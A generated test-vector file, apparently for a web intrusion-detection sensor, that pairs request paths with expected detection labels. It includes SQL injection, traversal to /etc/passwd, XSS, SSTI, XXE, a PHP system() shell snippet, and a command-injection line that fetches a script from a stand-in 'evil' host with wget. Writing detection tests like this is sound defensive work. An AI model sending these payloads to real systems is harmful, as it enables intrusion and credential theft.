# GENERATED by sensor/tools/gen_vectors.py - do not edit
# payload <TAB> first matching description
/items.php?id=1 UNION ALL SELECT username,password FROM users	potential sql injection
/download?file=../../../../etc/passwd	potential directory traversal
/search?q=<script>alert(1)</script>	potential xss injection
/cgi?cmd=;cat /etc/passwd;wget http://evil/x.sh	potential remote code execution
/x?tpl=${7*7}	potential ssti injection
/x?a=<?php system($_GET[0]); ?>	potential php injection
/.htaccess	config file access
/wp-config.php	config file access
/x?q=%7B%7B7*7%7D%7D	
/normal/page.html?id=42	
/x?email=a@b.com b@c.com c@d.com d@e.com	potential data leakage
/x?imei=123456789012345	potential data leakage
/x?dns1=8.8.8.8	potential dns changer
/x?data=[<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]	potential xxe injection
/acunetix_wvs_security_test	potential web scan
/x?a=1&b=2	
